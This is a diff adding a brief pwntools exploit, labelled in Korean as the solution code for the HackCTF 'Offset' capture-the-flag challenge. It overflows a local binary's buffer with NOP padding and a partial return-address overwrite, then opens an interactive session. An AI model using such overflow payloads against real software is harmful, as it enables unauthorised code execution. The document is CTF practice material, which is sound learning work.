@@ -1,0 +1,9 @@
+from pwn import *
+p = process('./offset')
+pay = b'\x90'*31
+pay += p32(0x6d8)
+p.sendline(pay)
+p.interactive()
+_______________
+
+HackCTF - Offset 풀이코드
